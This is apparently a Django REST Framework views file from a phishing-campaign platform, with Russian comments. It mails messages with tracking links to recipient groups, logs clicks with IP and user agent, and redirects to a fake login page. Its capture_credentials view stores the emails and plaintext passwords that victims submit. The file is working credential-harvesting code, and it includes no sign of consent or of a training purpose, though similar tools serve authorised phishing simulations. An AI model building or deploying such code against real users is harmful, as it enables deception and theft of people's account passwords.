from rest_framework import viewsets
from .models import Sender, RecipientGroup, Recipient, Message, ClickLog, CredentialLog
from .serializers import SenderSerializer, RecipientGroupSerializer, RecipientSerializer, MessageSerializer
from rest_framework.response import Response
from rest_framework.decorators import action

from django.core.mail import get_connection, EmailMessage
import logging
from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.utils.timezone import now

# Настройка логирования
logger = logging.getLogger(__name__)

def login_template_view(request, recipient_id):
    """Рендерит страницу логина с динамическим recipient_id."""
    return render(request, "email_templates/login.html", {"recipient_id": recipient_id})

class SenderViewSet(viewsets.ModelViewSet):
    queryset = Sender.objects.all()
    serializer_class = SenderSerializer

class RecipientGroupViewSet(viewsets.ModelViewSet):
    queryset = RecipientGroup.objects.all()
    serializer_class = RecipientGroupSerializer

    @action(detail=True, methods=['post'])
    def add_recipient(self, request, pk=None):
        group = self.get_object()
        recipient_id = request.data.get('recipient_id')

        try:
            recipient = Recipient.objects.get(id=recipient_id)
        except Recipient.DoesNotExist:
            logger.error(f"Recipient with ID {recipient_id} not found.")
            return Response({"detail": "Recipient not found."}, status=404)

        group.recipients.add(recipient)
        logger.info(f"Recipient {recipient.email} added to group {group.name}")
        return Response({"detail": "Recipient added to the group."}, status=200)

    def destroy(self, request, *args, **kwargs):
        group = self.get_object()
        logger.info(f"Deleting group: {group.name}, ID: {group.id}")
        group.recipients.clear()
        logger.info(f"Cleared all recipients from group: {group.name}")
        group.delete()
        logger.info(f"Group {group.name} deleted successfully.")
        return Response(status=204)


class RecipientViewSet(viewsets.ModelViewSet):
    queryset = Recipient.objects.all()
    serializer_class = RecipientSerializer

    @action(detail=True, methods=['put'])
    def update_recipient(self, request, pk=None):
        recipient = self.get_object()
        serializer = self.get_serializer(recipient, data=request.data, partial=True)
        if serializer.is_valid():
            serializer.save()
            logger.info(f"Recipient {recipient.email} updated successfully.")
            return Response(serializer.data)
        logger.error(f"Error updating recipient {recipient.email}: {serializer.errors}")
        return Response(serializer.errors, status=400)


class MessageViewSet(viewsets.ModelViewSet):
    queryset = Message.objects.all()
    serializer_class = MessageSerializer

    @action(detail=False, methods=['post'])
    def send_message(self, request):
        sender_id = request.data.get("sender")
        group_id = request.data.get("recipient_group")
        subject = request.data.get("subject")
        body = request.data.get("body")
        use_template = request.data.get("use_template", False)

        try:
            sender = Sender.objects.get(id=sender_id)
            group = RecipientGroup.objects.get(id=group_id)
        except Sender.DoesNotExist:
            return Response({"detail": "Sender not found."}, status=404)
        except RecipientGroup.DoesNotExist:
            return Response({"detail": "Recipient Group not found."}, status=404)

        recipient_emails = group.recipients.values_list('email', flat=True)

        if not recipient_emails:
            return Response({"detail": "No recipients in the group."}, status=400)

        # Создание правильной ссылки для отслеживания
        if use_template:
            link = f"http://localhost:8000/email-template/{group_id}/"
            body += f"\n\n🔗 Click here: {link}"

        try:
            connection = get_connection(
                backend='django.core.mail.backends.smtp.EmailBackend',
                host=sender.smtp_host,
                port=sender.smtp_port,
                username=sender.smtp_username,
                password=sender.smtp_password,
                use_tls=sender.smtp_port == 587,
                use_ssl=sender.smtp_port == 465
            )

            email = EmailMessage(
                subject=subject,
                body=body,
                from_email=sender.smtp_username,
                to=list(recipient_emails),
                connection=connection
            )

            result = email.send()

            if result == 0:
                return Response({"detail": "Email sending failed."}, status=500)

            message = Message.objects.create(
                sender=sender, recipient_group=group, subject=subject, body=body, link=link if use_template else None
            )

            return Response({"status": "Message sent successfully"}, status=201)

        except Exception as e:
            return Response({"detail": f"Email sending failed: {str(e)}"}, status=500)


def track_click(request, recipient_id):
    """Фиксирует факт клика и перенаправляет пользователя на форму логина."""
    ip = get_client_ip(request)
    user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')

    try:
        recipient = Recipient.objects.get(id=recipient_id)
    except Recipient.DoesNotExist:
        recipient = None

    ClickLog.objects.create(
        recipient=recipient,
        ip_address=ip,
        user_agent=user_agent,
        timestamp=now()
    )

    return redirect(f"/email-template/{recipient_id}/")


def capture_credentials(request, recipient_id):
    """Сохраняет введённые данные (email и пароль) в базу данных."""
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")
        ip = get_client_ip(request)
        user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')

        try:
            recipient = Recipient.objects.get(id=recipient_id)
        except Recipient.DoesNotExist:
            recipient = None

        CredentialLog.objects.create(
            recipient=recipient,
            email=email,
            password=password,
            ip_address=ip,
            user_agent=user_agent,
            timestamp=now()
        )

        return JsonResponse({"status": "success"}, status=200)

    return JsonResponse({"status": "error"}, status=400)


def get_client_ip(request):
    """Получаем IP пользователя."""
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    return x_forwarded_for.split(',')[0] if x_forwarded_for else request.META.get('REMOTE_ADDR')
